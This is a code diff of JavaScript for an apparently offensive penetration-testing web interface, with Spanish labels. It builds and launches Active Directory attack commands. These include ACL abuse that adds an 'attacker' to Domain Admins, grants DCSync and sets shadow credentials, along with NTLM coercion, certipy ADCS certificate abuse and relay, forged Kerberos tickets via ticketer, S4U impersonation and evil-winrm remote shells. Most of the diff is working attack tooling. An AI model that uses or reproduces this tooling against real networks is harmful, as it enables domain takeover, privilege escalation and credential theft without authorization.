+  const a2 = document.getElementById('acl-bld-a2');
+  a2w.style.display = '';
+  const cfg = {
+    'add groupMember':      ['GRUPO', 'Domain Admins', 'MIEMBRO (sAMAccountName)', 'attacker'],
+    'remove groupMember':   ['GRUPO', 'Domain Admins', 'MIEMBRO (sAMAccountName)', 'attacker'],
+    'add genericAll':       ['OBJETO TARGET', 'victim', 'GRANTEE (quién recibe)', 'attacker'],
+    'remove genericAll':    ['OBJETO TARGET', 'victim', 'GRANTEE', 'attacker'],
+    'add rbcd':             ['COMPUTADORA TARGET (nombre$)', 'TARGETPC$', 'GRANTEE (nombre$)', 'ATTACKERPC$'],
+    'remove rbcd':          ['COMPUTADORA TARGET (nombre$)', 'TARGETPC$', 'GRANTEE (nombre$)', 'ATTACKERPC$'],
+    'set password':         ['CUENTA TARGET', 'victim', 'NUEVA PASSWORD', 'NewPass123!'],
+    'get object':           ['OBJETO (sAMAccountName/DN)', 'victim', 'ATRIBUTO (opcional)', 'memberOf'],
+  };
+  const noArg2 = ['add dcsync','remove dcsync','add shadowCredentials','remove shadowCredentials'];
+  if (noArg2.includes(cmd)) {
+    a1l.textContent = 'OBJETO TARGET (sAMAccountName)';
+    a1.placeholder = (cmd.includes('dcsync')) ? 'attacker' : 'victim$';
+    a2w.style.display = 'none';
+  } else if (cfg[cmd]) {
+    const [l1,p1,l2,p2] = cfg[cmd];
+    a1l.textContent = l1; a1.placeholder = p1;
+    a2l.textContent = l2; a2.placeholder = p2;
+  }
+  bAcl();
+}
+
+function aclPwSwitch() {
+  const act = gv('acl-pw-act').split(' ')[0];
+  document.getElementById('acl-pw-fname-grp').style.display = (act === 'add') ? '' : 'none';
+  document.getElementById('acl-pw-devid-grp').style.display = (act === 'remove') ? '' : 'none';
+  bAcl();
+}
+
+async function bAcl() {
+  const dc = gv('acl-dc') || '192.168.1.10';
+  const dom = gv('acl-dom') || 'domain.local';
+  const u = gv('acl-u') || 'user';
+  const p = gv('acl-p') || 'Password1!';
+  const t = gv('acl-t') || 'dacledit';
+  const isHash = /^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$/.test(p);
+  let c = '';
+
+  if (t === 'dacledit') {
+    const path = (await resolveImpacket('dacledit.py')) || 'dacledit.py';
+    const creds = isHash ? `${dom}/${u} -hashes ${p}` : `${dom}/${u}:'${p}'`;
+    const act = (gv('acl-dacl-act') || 'write').split(' ')[0];
+    const rights = gv('acl-dacl-rights') || 'FullControl';
+    const target = gv('acl-dacl-target');
+    const dn = gv('acl-dacl-dn');
+    const princ = gv('acl-dacl-princ') || 'attacker';
+    const targetArg = dn ? `-target-dn '${dn}'` : `-target '${target || 'victim'}'`;
+    const rightArg = (act === 'write') ? ` -rights ${rights}` : '';
+    const princArg = (act === 'write' || act === 'remove') ? ` -principal '${princ}'` : '';
+    c = `<span class="b">python3 ${path}</span> <span class="f">${creds} -dc-ip ${dc} -action ${act}${rightArg}${princArg} ${targetArg}</span>`;
+
+  } else if (t === 'owneredit') {
+    const path = (await resolveImpacket('owneredit.py')) || 'owneredit.py';
+    const creds = isHash ? `${dom}/${u} -hashes ${p}` : `${dom}/${u}:'${p}'`;
+    const act = (gv('acl-own-act') || 'write').split(' ')[0];
+    const target = gv('acl-own-target');
+    const dn = gv('acl-own-dn');
+    const newowner = gv('acl-own-newowner') || 'attacker';
+    const targetArg = dn ? `-target-dn '${dn}'` : `-target '${target || 'victim'}'`;
+    const newownerArg = (act === 'write') ? ` -new-owner '${newowner}'` : '';
+    c = `<span class="b">python3 ${path}</span> <span class="f">${creds} -dc-ip ${dc} -action ${act}${newownerArg} ${targetArg}</span>`;
+
+  } else if (t === 'bloodyad') {
+    const creds = isHash ? `-u ${u} -p :${p.split(':')[1]}` : `-u ${u} -p '${p}'`;
+    const cmd = gv('acl-bld-cmd') || 'add groupMember';
+    const a1 = gv('acl-bld-a1') || '??';
+    const a2 = gv('acl-bld-a2');
+    const noArg2 = ['add dcsync','remove dcsync','add shadowCredentials','remove shadowCredentials'];
+    let args;
+    if (cmd === 'get object') {
+      args = `'${a1}'` + (a2 ? ` --attr ${a2}` : '');
+    } else if (noArg2.includes(cmd)) {
+      args = `'${a1}'`;
+    } else {
+      args = `'${a1}' '${a2 || '??'}'`;
+    }
+    c = `<span class="b">bloodyAD</span> <span class="f">--host ${dc} -d ${dom} ${creds} ${cmd} ${args}</span>`;
+
+  } else if (t === 'pywhisker') {
+    const act = (gv('acl-pw-act') || 'add').split(' ')[0];
+    const target = gv('acl-pw-target') || 'victim$';
+    const fname = gv('acl-pw-fname') || '/tmp/shadow_cred';
+    const devid = gv('acl-pw-devid');
+    let extra = '';
+    if (act === 'add') extra = ` --filename ${fname}`;
+    else if (act === 'remove' && devid) extra = ` --device-id ${devid}`;
+    c = `<span class="b">python3 /opt/pywhisker/pywhisker.py</span> <span class="f">-d ${dom} -u ${u} -p '${p}' --dc-ip ${dc} --target '${target}' --action ${act}${extra}</span>`;
+  }
+  setH('acl-cmd', c);
+}
+// ── COERCION ─────────────────────────────────────────────
+// Resolved paths cache: toolKey → confirmed path string, or false if not found
+const _crcPaths = {};
+
+async function crcResolvePath(toolKey) {
+  if (_crcPaths[toolKey] !== undefined) return _crcPaths[toolKey];
+  const info = TOOL_DB[toolKey];
+  if (!info) { _crcPaths[toolKey] = false; return false; }
+
+  if (info.type === 'pip') {
+    try {
+      const r = await fetch(API + '/check', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({tool: toolKey}) });
+      const d = await r.json();
+      _crcPaths[toolKey] = d.found ? (d.path || toolKey) : false;
+    } catch(_) { _crcPaths[toolKey] = false; }
+    return _crcPaths[toolKey];
+  }
+
+  if (info.path) {
+    // Check the expected path first
+    try {
+      const r = await fetch(API + '/validate/file', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({path: info.path}) });
+      if ((await r.json()).exists) { _crcPaths[toolKey] = info.path; return info.path; }
+    } catch(_) {}
+    // Fallback: search the clone directory for the script
+    if (info.searchDir && info.searchName) {
+      try {
+        const r = await fetch(API + '/tools/find-script', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({directory: info.searchDir, name: info.searchName}) });
+        const d = await r.json();
+        if (d.found && d.path) {
+          info.path = d.path; // update for future fast-path
+          _crcPaths[toolKey] = d.path;
+          return d.path;
+        }
+      } catch(_) {}
+    }
+    _crcPaths[toolKey] = false;
+    return false;
+  }
+  return false;
+}
+
+function crcInvalidate(toolKey) { delete _crcPaths[toolKey]; }
+
+async function bCoerce() {
+  const lh=gv('crc-lh')||'192.168.1.5', tgt=gv('crc-tgt')||'192.168.1.10';
+  const u=gv('crc-u'), p=gv('crc-p'), dom=gv('crc-dom')||'domain.local', t=gv('crc-t');
+  const valEl = document.getElementById('crc-val');
+  const runBtn = document.getElementById('crc-run');
+
+  const toolKey = t === 'Coercer' ? 'coercer' : t;
+  const resolvedPath = await crcResolvePath(toolKey);
+
+  if (!resolvedPath) {
+    const info = TOOL_DB[toolKey];
+    const label = info?.label || toolKey;
+    const hint = info?.path ? ` — ruta esperada: ${info.path}` : '';
+    if (valEl) { valEl.className = 'val-msg err'; valEl.style.display = ''; valEl.textContent = `✗ ${label} no encontrado${hint} — instala la herramienta con el botón ⬇ en la barra superior`; }
+    if (runBtn) runBtn.disabled = true;
+    setH('crc-cmd', '');
+    return;
+  }
+
+  if (valEl) { valEl.className = 'val-msg'; valEl.style.display = 'none'; }
+  if (runBtn) runBtn.disabled = false;
+
+  let c='';
+  if (t==='Coercer') {
+    const auth=u&&p?` -u ${u} -p '${p}' -d ${dom}`:'';
+    c=`<span class="b">coercer</span> <span class="f">coerce${auth} -l ${lh} -t ${tgt}</span>`;
+  } else {
+    c=`<span class="b">python3 ${resolvedPath}</span> <span class="v">${lh}</span> <span class="v">${tgt}</span>${u&&p?` <span class="f">-u ${u} -p '${p}' -d ${dom}</span>`:''}`;
+  }
+  setH('crc-cmd', c);
+}
+
+async function crcRun() {
+  const t = gv('crc-t');
+  const toolKey = t === 'Coercer' ? 'coercer' : t;
+  crcInvalidate(toolKey); // always do a fresh check before running
+  await bCoerce();
+  const runBtn = document.getElementById('crc-run');
+  if (runBtn && runBtn.disabled) return;
+  runTool('crc');
+}
+// ── CERTIPY / ADCS ───────────────────────────────────────
+function bCert() {
+  const dc=gv('adc-dc')||'192.168.1.10', dom=gv('adc-dom')||'domain.local';
+  const u=gv('adc-u')||'user', p=gv('adc-p')||'Password1!';
+  const panel=document.querySelector('#p-ad-cert .tab.on');
+  const tab=panel?panel.textContent.trim().toLowerCase():'find';
+  let c='';
+  if(tab==='find'){
+    const opts=chks('adc-find-opts');
+    c=`<span class="b">certipy</span> <span class="f">find -u '${u}@${dom}' -p '${p}' -dc-ip ${dc}${opts?' '+opts:''}</span>`;
+  } else if(tab==='request'){
+    const ca=gv('adc-ca')||'domain-CA', tmpl=gv('adc-tmpl')||'User';
+    const upn=gv('adc-upn'), out=gv('adc-outfile')||'/tmp/admin.pfx';
+    c=`<span class="b">certipy</span> <span class="f">req -u '${u}@${dom}' -p '${p}' -dc-ip ${dc} -ca '${ca}' -template '${tmpl}'${upn?' -upn \''+upn+'\'':''} -out '${out}'</span>`;
+  } else if(tab==='auth'){
+    const pfx=gv('adc-pfx')||'/tmp/admin.pfx', adom=gv('adc-adom')||dom;
+    c=`<span class="b">certipy</span> <span class="f">auth -pfx '${pfx}' -domain ${adom} -dc-ip ${dc}</span>`;
+  } else if(tab==='relay'){
+    const rca=gv('adc-rca')||'192.168.1.10', rtmpl=gv('adc-rtmpl')||'DomainController', rif=gv('adc-rif')||'eth0';
+    c=`<span class="b">certipy</span> <span class="f">relay -ca ${rca} -template '${rtmpl}' -interface ${rif}</span>`;
+  }
+  setH('adc-cmd', c);
+}
+// ── TICKETS ──────────────────────────────────────────────
+function tktModeSwitch() {
+  const mode = gv('st-mode');
+  const ig = document.getElementById('st-imper-grp');
+  if (ig) ig.style.display = (mode === 'normal') ? 'none' : '';
+  bTickets();
+}
+
+function tktSetKrb5() {
+  const u = gv('tgt-u').trim();
+  const name = (u && u !== 'user') ? `${u}.ccache` : '*.ccache';
+  execDirect(
+    `f=$(find /opt/x9-evilkit . /tmp ~ -maxdepth 4 -name "${name}" 2>/dev/null | head -1); ` +
+    `if [ -n "$f" ]; then export KRB5CCNAME="$f"; echo "[+] KRB5CCNAME=$KRB5CCNAME"; ` +
+    `else echo "[-] No se encontró ${name} — ejecuta getTGT primero"; fi`
+  );
+}
+
+async function bTickets() {
+  const panel = document.querySelector('#p-ad-tickets .tab.on');
+  const tab   = panel ? panel.textContent.trim().toLowerCase() : 'gettgt';
+  const val   = document.getElementById('tkt-val');
+  const warn  = m => { if (val) val.innerHTML = `<span style="color:var(--yellow)">⚠ ${m}</span>`; };
+  const ok    = () => { if (val) val.innerHTML = ''; };
+  let c = '';
+
+  if (tab === 'gettgt') {
+    const dom = gv('tgt-dom');
+    const u   = gv('tgt-u');
+    const p   = gv('tgt-p') || 'Password1!';
+    const dc  = gv('tgt-dc');
+
+    // Actualizar hint del nombre del .ccache
+    const hint = document.getElementById('tgt-ccache-name');
+    if (hint) hint.textContent = (u && u !== 'user') ? `${u}.ccache` : 'usuario.ccache';
+
+    if (!dom) { warn('Introduce el dominio'); return; }
+    if (!u)   { warn('Introduce el usuario'); return; }
+    if (!dc)  { warn('Introduce la IP del DC'); return; }
+    ok();
+
+    const path   = (await resolveImpacket('getTGT.py')) || 'getTGT.py';
+    const isHash = /^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$/.test(p);
+    const cred   = isHash ? `${dom}/${u} -hashes ${p}` : `${dom}/${u}:'${p}'`;
+    // getTGT.py no tiene -outputfile — genera <usuario>.ccache automáticamente
+    c = `<span class="b">python3 ${path}</span> <span class="f">${cred} -dc-ip ${dc}</span>`;
+
+  } else if (tab === 'getst') {
+    const dom   = gv('st-dom');
+    const u     = gv('st-u');
+    const p     = gv('st-p') || 'Password1!';
+    const proto = gv('st-proto') || 'cifs';
+    const hn    = gv('st-hn').trim();
+    const dc    = gv('st-dc');
+    const mode  = gv('st-mode') || 'normal';
+    const imper = gv('st-imper') || 'Administrator';
+
+    if (!dom) { warn('Introduce el dominio'); return; }
+    if (!u)   { warn('Introduce el usuario o cuenta de servicio'); return; }
+    if (!dc)  { warn('Introduce la IP del DC'); return; }
+    if ((mode === 'normal' || mode === 's4u2proxy') && !hn) {
+      warn('Introduce el hostname real del target para construir el SPN — no uses valores genéricos'); return;
+    }
+    // Advertir si el hostname parece un placeholder genérico
+    if (hn && /^dc\.(domain|example|test|corp)\.local$/i.test(hn)) {
+      warn('El hostname parece un placeholder. Usa el nombre real (ej: DC01 o DC01.domain.local)');
+    } else { ok(); }
+
+    const path   = (await resolveImpacket('getST.py')) || 'getST.py';
+    const isHash = /^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$/.test(p);
+    const cred   = isHash ? `${dom}/${u} -hashes ${p}` : `${dom}/${u}:'${p}'`;
+    const spn    = hn ? `${proto}/${hn}` : `${proto}/?`;
+
+    if (mode === 'normal') {
+      c = `<span class="b">python3 ${path}</span> <span class="f">${cred} -spn ${spn} -dc-ip ${dc}</span>`;
+    } else if (mode === 's4u2self') {
+      c = `<span class="b">python3 ${path}</span> <span class="f">${cred} -impersonate ${imper} -self -dc-ip ${dc}</span>`;
+    } else {
+      // S4U2Self+Proxy: -spn + -impersonate
+      c = `<span class="b">python3 ${path}</span> <span class="f">${cred} -spn ${spn} -impersonate ${imper} -dc-ip ${dc}</span>`;
+    }
+
+  } else if (tab === 'ticketer') {
+    const dom  = gv('fgt-dom')  || 'domain.local';
+    const sid  = gv('fgt-sid')  || 'S-1-5-21-...';
+    const u    = gv('fgt-u')    || 'Administrator';
+    const h    = gv('fgt-h')    || 'aabbcc00';
+    const spn  = gv('fgt-spn');
+    const grp  = gv('fgt-grp')  || '512,519';
+    const path = (await resolveImpacket('ticketer.py')) || 'ticketer.py';
+    if (spn)
+      c = `<span class="b">python3 ${path}</span> <span class="f">-nthash ${h} -domain-sid ${sid} -domain ${dom} -spn '${spn}' -groups ${grp}</span> <span class="v">${u}</span>`;
+    else
+      c = `<span class="b">python3 ${path}</span> <span class="f">-nthash ${h} -domain-sid ${sid} -domain ${dom} -groups ${grp}</span> <span class="v">${u}</span>`;
+  }
+  setH('tkt-cmd', c);
+}
+// ── EVIL-WINRM ───────────────────────────────────────────
+function bWinrm() {
+  const h=gv('ew-h')||'192.168.1.10', u=gv('ew-u')||'Administrator', p=gv('ew-p')||'Password1!';
+  const s=gv('ew-s'), e=gv('ew-e'), opts=chks('ew-opts');
+  const isHash=p.includes(':');
+  let c=`<span class="b">evil-winrm</span> <span class="f">-i ${h} -u ${u}</span>`;
+  c+=isHash?` <span class="f">-H ${p}</span>`:`<span class="f"> -p '${p}'</span>`;
+  if(s) c+=` <span class="f">-s '${s}'</span>`;
+  if(e) c+=` <span class="f">-e '${e}'</span>`;
+  if(opts) c+=` <span class="f">${opts}</span>`;
+  setH('ew-cmd', c);
 }
 function bTcpdump() {
   const i=gv('td-i')||'eth0', f=gv('td-f'), c=gv('td-c'), w=gv('td-w'), op=chks('td-op');
